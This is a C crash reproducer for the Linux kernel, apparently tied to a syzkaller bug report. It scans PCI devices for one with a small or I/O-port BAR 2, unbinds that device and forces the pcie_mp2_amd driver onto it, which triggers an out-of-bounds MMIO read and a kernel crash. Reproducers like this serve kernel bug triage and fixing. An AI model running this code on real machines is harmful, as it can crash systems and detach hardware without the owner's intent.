// https://syzkaller.appspot.com/bug?id=227a9acbe565367eb7a1277b47115df8706d9a12
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

struct pci_dev {
    char name[256];
    unsigned int class_val;
    int has_bar2;
    int is_ideal;
};

int main(void) {
    DIR *dir = opendir("/sys/bus/pci/devices");
    if (!dir) {
        printf("[-] opendir failed: %s\n", strerror(errno));
        return 1;
    }

    struct dirent *ent;
    struct pci_dev devs[128];
    int num_devs = 0;

    while ((ent = readdir(dir)) != NULL && num_devs < 128) {
        if (ent->d_name[0] == '.') continue;

        char path[512];
        
        unsigned int class_val = 0;
        snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/class", ent->d_name);
        FILE *fc = fopen(path, "r");
        if (fc) {
            if (fscanf(fc, "%x", &class_val) != 1) {
                class_val = 0;
            }
            fclose(fc);
        }

        snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource", ent->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;

        unsigned long long start, end, flags;
        int bar = 0;
        int has_bar2 = 0;
        int is_ideal = 0;
        
        while (fscanf(f, "%llx %llx %llx\n", &start, &end, &flags) == 3) {
            if (bar == 2) {
                unsigned long long len = (end == 0) ? 0 : (end - start + 1);
                if (len > 0) {
                    has_bar2 = 1;
                    /* 
                     * We want a device where BAR 2 is either an I/O port (flags & 0x100)
                     * or a memory region smaller than 0x1068c (the offset accessed by the driver).
                     * This ensures that reading from mmio + 0x1068c will cause a page fault.
                     */
                    if ((flags & 0x100) || len < 0x1068c) {
                        is_ideal = 1;
                    }
                }
                break;
            }
            bar++;
        }
        fclose(f);

        if (has_bar2) {
            strcpy(devs[num_devs].name, ent->d_name);
            devs[num_devs].class_val = class_val;
            devs[num_devs].has_bar2 = has_bar2;
            devs[num_devs].is_ideal = is_ideal;
            num_devs++;
        }
    }
    closedir(dir);

    char target_dev[256] = {0};

    /* Priority 1: Ideal and not critical (not bridge, storage, network, display) */
    for (int i = 0; i < num_devs; i++) {
        unsigned int bc = devs[i].class_val >> 16;
        if (devs[i].is_ideal && bc != 0x06 && bc != 0x01 && bc != 0x02 && bc != 0x03) {
            strcpy(target_dev, devs[i].name);
            break;
        }
    }

    /* Priority 2: Ideal and critical */
    if (target_dev[0] == '\0') {
        for (int i = 0; i < num_devs; i++) {
            unsigned int bc = devs[i].class_val >> 16;
            if (devs[i].is_ideal && bc != 0x06) {
                strcpy(target_dev, devs[i].name);
                break;
            }
        }
    }

    /* Priority 3: Any not critical */
    if (target_dev[0] == '\0') {
        for (int i = 0; i < num_devs; i++) {
            unsigned int bc = devs[i].class_val >> 16;
            if (bc != 0x06 && bc != 0x01 && bc != 0x02 && bc != 0x03) {
                strcpy(target_dev, devs[i].name);
                break;
            }
        }
    }

    /* Priority 4: Any */
    if (target_dev[0] == '\0') {
        for (int i = 0; i < num_devs; i++) {
            unsigned int bc = devs[i].class_val >> 16;
            if (bc != 0x06) {
                strcpy(target_dev, devs[i].name);
                break;
            }
        }
    }

    if (target_dev[0] == '\0') {
        printf("[-] No suitable PCI device found.\n");
        return 1;
    }

    printf("[+] Found suitable device: %s\n", target_dev);
    sync();

    char path[512];
    
    /* 1. Unbind the device from its current driver */
    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/driver/unbind", target_dev);
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        dprintf(fd, "%s\n", target_dev);
        close(fd);
        printf("[+] Unbound device.\n");
    } else {
        printf("[-] Failed to open unbind (might not be bound): %s\n", strerror(errno));
    }

    /* 2. Set driver_override to the vulnerable driver */
    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/driver_override", target_dev);
    fd = open(path, O_WRONLY);
    if (fd >= 0) {
        if (dprintf(fd, "pcie_mp2_amd\n") < 0) {
            printf("[-] Failed to write to driver_override: %s\n", strerror(errno));
            return 1;
        }
        close(fd);
        printf("[+] Set driver_override.\n");
    } else {
        printf("[-] Failed to set driver_override: %s\n", strerror(errno));
        return 1;
    }

    /* 3. Trigger the probe */
    fd = open("/sys/bus/pci/drivers_probe", O_WRONLY);
    if (fd >= 0) {
        if (dprintf(fd, "%s\n", target_dev) < 0) {
            printf("[-] Failed to write to drivers_probe: %s\n", strerror(errno));
        } else {
            printf("[+] Triggered probe.\n");
        }
        close(fd);
    } else {
        printf("[-] Failed to open drivers_probe: %s\n", strerror(errno));
        return 1;
    }

    /* Wait a bit for the crash */
    sleep(2);
    printf("[+] Done.\n");
    return 0;
}
